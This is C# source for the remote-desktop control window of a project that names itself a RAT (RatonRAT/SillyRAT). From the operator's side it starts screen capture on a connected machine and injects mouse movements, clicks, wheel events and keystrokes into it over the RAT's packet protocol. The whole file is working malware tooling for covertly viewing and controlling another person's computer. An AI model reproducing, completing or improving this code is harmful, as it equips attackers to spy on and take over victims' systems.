using Server.Connection;
using SillyRAT;
using Stuff;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Windows.Forms;

namespace RatonRAT.ClientForms
{
    public partial class FormRemote : Form
    {
        public SillyClient SillyClient { get; set; }
        public int FPS { get; set; }
        public object OneByOne { get; set; }
        public Point imageSize { get; set; }
        private List<Keys> keysPressed { get; set; }
        private bool isMouseDown = false;
        private Point mouseOffset;

        public FormRemote()
        {
            InitializeComponent();
            OneByOne = new object();
            keysPressed = new List<Keys>();
        }

        private void Form_Paint(object sender, PaintEventArgs e)
        {
            if (!this.DesignMode)
            {
                using (Pen pen = new Pen(Color.White, 3))
                {
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
                    e.Graphics.DrawPath(pen, CreateRoundPath(this.ClientRectangle, 25));
                }
            }
        }

        private void FormRemote_Load(object sender, EventArgs e)
        {
            this.Paint += Form_Paint;
            timer2.Start();
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
            this.MouseDown += Form_MouseDown;
            this.MouseMove += Form_MouseMove;
            this.MouseUp += Form_MouseUp;
            this.MouseWheel += MouseWheelHandler;
            trackBar1.Value = 40;
            StopCapture();
            Program.form2.Invoke(new Action(() =>
            {
                Program.form2.AddLog("Configurate the screen settings and click start!", Color.LightGreen);
            }));
        }

        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            StartCapture(comboBox1.SelectedIndex);
            button1.Enabled = false;
            button2.Enabled = true;
            label1.Enabled = true;
            comboBox1.Enabled = false;
            trackBar1.Enabled = false;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            StopCapture();
            button1.Enabled = true;
            button2.Enabled = false;
            label1.Enabled = false;
            comboBox1.Enabled = true;
            trackBar1.Enabled = true;
        }
        public void StartCapture(int screen)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "RemoteDesktop");
            pack.Set("Command", "Start");
            pack.Set("Quality", trackBar1.Value);
            pack.Set("Screen", screen);
            SillyClient.Send(pack.Pacc());
            Program.form2.Invoke(new Action(() =>
            {
                Program.form2.AddLog("Remote desktop started!", Color.LightGreen);
            }));
        }

        public void StopCapture()
        {
            Pack pack = new Pack();
            pack.Set("Packet", "RemoteDesktop");
            pack.Set("Command", "Stop");
            SillyClient.Send(pack.Pacc());
            Program.form2.Invoke(new Action(() =>
            {
                Program.form2.AddLog("Remote desktop stopped!", Color.Red);
            }));
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (SillyClient == null || !SillyClient.isConnected())
            {
                this.Close();
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            label1.Text = "FPS: " + FPS;
            FPS = 0;
        }

        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            int button = e.Button == MouseButtons.Left ? 2 : e.Button == MouseButtons.Right ? 8 : 0;
            if (button != 0) Clickk(button);
        }

        private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            int button = e.Button == MouseButtons.Left ? 4 : e.Button == MouseButtons.Right ? 16 : 0;
            if (button != 0) Clickk(button);
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            if (checkBox2.Checked && !button1.Enabled)
            {
                Point p = new Point(e.X * imageSize.X / pictureBox1.Width, e.Y * imageSize.Y / pictureBox1.Height);
                Pack pack = new Pack();
                pack.Set("Packet", "RemoteDesktop");
                pack.Set("Command", "MouseMove");
                pack.Set("X", p.X);
                pack.Set("Y", p.Y);
                SillyClient.Send(pack.Pacc());
            }
        }

        private void Clickk(int button)
        {
            if (checkBox2.Checked && !button1.Enabled)
            {
                Pack pack = new Pack();
                pack.Set("Packet", "RemoteDesktop");
                pack.Set("Command", "MouseClick");
                pack.Set("Button", button);
                SillyClient.Send(pack.Pacc());
            }
        }

        private void MouseWheelHandler(object sender, MouseEventArgs e)
        {
            if (checkBox2.Checked && !button1.Enabled)
            {
                Pack pack = new Pack();
                pack.Set("Packet", "RemoteDesktop");
                pack.Set("Command", "MouseWheel");
                pack.Set("Delta", e.Delta);
                SillyClient.Send(pack.Pacc());
            }
        }

        private bool IsLockKey(Keys key)
        {
            return key == Keys.CapsLock || key == Keys.NumLock || key == Keys.Scroll;
        }

        private void FormRemote_FormClosing(object sender, FormClosingEventArgs e)
        {
            StopCapture();
        }

        private void Form_MouseDown(object sender, MouseEventArgs e)
        {
            isMouseDown = true;
            mouseOffset = new Point(e.X, e.Y);
        }

        private void Form_MouseMove(object sender, MouseEventArgs e)
        {
            if (isMouseDown)
            {
                this.Location = new Point(this.Left + e.X - mouseOffset.X, this.Top + e.Y - mouseOffset.Y);
            }
        }

        private void Form_MouseUp(object sender, MouseEventArgs e)
        {
            isMouseDown = false;
        }

        private void FormRemote_KeyDown(object sender, KeyEventArgs e)
        {
            if (checkBox1.Checked && !button1.Enabled)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                if (keysPressed.Contains(e.KeyCode))
                    return;

                keysPressed.Add(e.KeyCode);

                Pack pack = new Pack();
                pack.Set("Packet", "RemoteDesktop");
                pack.Set("Command", "KeyboardClick");
                pack.Set("isKeyDown", true);
                pack.Set("Key", Convert.ToInt32(e.KeyCode));
                SillyClient.Send(pack.Pacc());
            }
        }

        private void FormRemote_KeyUp(object sender, KeyEventArgs e)
        {
            if (checkBox2.Checked && !button1.Enabled)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                keysPressed.Remove(e.KeyCode);

                Pack pack = new Pack();
                pack.Set("Packet", "RemoteDesktop");
                pack.Set("Command", "KeyboardClick");
                pack.Set("isKeyDown", false);
                pack.Set("Key", Convert.ToInt32(e.KeyCode));
                SillyClient.Send(pack.Pacc());
            }
        }

        private void mouseToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (checkBox2.Checked == false)
            {
                checkBox2.Checked = true;
            } else
            {
                checkBox2.Checked = false;
            }
        }

        private void keyboardToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (checkBox1.Checked == false)
            {
                checkBox1.Checked = true;
            }
            else
            {
                checkBox1.Checked = false;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            this.Close();
        }
    }
}
